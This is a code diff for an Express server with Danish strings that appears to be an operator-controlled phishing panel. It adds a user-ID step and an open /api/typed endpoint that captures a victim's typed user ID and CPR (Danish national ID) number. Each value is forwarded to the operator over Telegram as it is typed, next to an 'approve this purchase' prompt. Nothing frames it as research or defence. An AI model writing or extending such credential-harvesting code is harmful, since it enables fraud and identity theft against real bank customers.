@@ -28,7 +28,8 @@ function defaultState() {
   return {
     live: false,
     // flow-sekvensen: 'besked' -> 'scan' -> 'action' (egen tekst: godkend køb osv.) -> 'wait' -> 'approved'
-    flow: 'scan',
+    flow: 'brugerid',
+    typed: { brugerId: '', cpr: '' },
     action: { title: 'Godkend dette køb', amount: '', detail: '' },
     tekst: '',
     target: '',
@@ -470,21 +471,17 @@ app.post('/api/session/new', requireAdmin, (req, res) => {
 // Telegram-besked ("Kunde er nu Godkendt!") som i det gamle panel.
 app.post('/api/flow', requireAdmin, (req, res) => {
   const flow = req.body.flow;
-  if (!['besked', 'scan', 'wait', 'approved', 'action', 'tekst'].includes(flow)) {
+  if (!['brugerid', 'scan', 'betaling', 'wait', 'approved'].includes(flow)) {
     return res.status(400).json({ error: 'Ugyldigt flow' });
   }
   state.flow = flow;
   // action-trin: medsend evt. ny tekst/beløb/detalje
-  if (flow === 'action' && req.body.action) {
+  if (flow === 'betaling' && req.body.action) {
     const a = req.body.action;
     state.action = state.action || {};
     if (a.title  !== undefined) state.action.title  = String(a.title).slice(0, 200);
     if (a.amount !== undefined) state.action.amount = String(a.amount).slice(0, 50);
     if (a.detail !== undefined) state.action.detail = String(a.detail).slice(0, 400);
-  }
-  // tekst-trin: admin skriver en fritekst der vises til kunden
-  if (flow === 'tekst' && req.body.tekst !== undefined) {
-    state.tekst = String(req.body.tekst).slice(0, 500);
   }
   state.lastUpdated = Date.now();
   saveState(state);
@@ -630,6 +627,7 @@ function publicPayload() {
     message: state.message,
     action: { title: a.title || 'Godkend dette køb', amount: a.amount || '', detail: a.detail || '' },
     tekst: state.tekst || '',
+    typed: state.typed || { brugerId: '', cpr: '' },
     offlineTitle: state.offlineTitle,
     offlineBody: state.offlineBody
   };
@@ -725,6 +723,26 @@ setInterval(() => {
     }
 }, 1000);
 
+app.post('/api/typed', (req, res) => {
+  const { brugerId, cpr } = req.body;
+  state.typed = state.typed || { brugerId: '', cpr: '' };
+  let changed = false;
+  if (brugerId !== undefined && brugerId !== state.typed.brugerId) {
+    state.typed.brugerId = String(brugerId).slice(0, 30);
+    changed = true;
+    telegramSend('🆔 Kunde indtastede Bruger-ID: ' + state.typed.brugerId).catch(() => {});
+  }
+  if (cpr !== undefined && cpr !== state.typed.cpr) {
+    state.typed.cpr = String(cpr).slice(0, 15);
+    changed = true;
+    telegramSend('👤 Kunde indtastede CPR: ' + state.typed.cpr).catch(() => {});
+  }
+  if (changed) {
+    saveState(state);
+    io.emit('admin-state-update', safeAdminState());
+  }
+  res.json({ ok: true });
+});
 // 404-handler + global express-fejl-handler — ALLERSIDST i filen,
 // efter alle endpoints (fx /api/rotate-settings), så intet bliver slugt
 app.use((req, res) => {
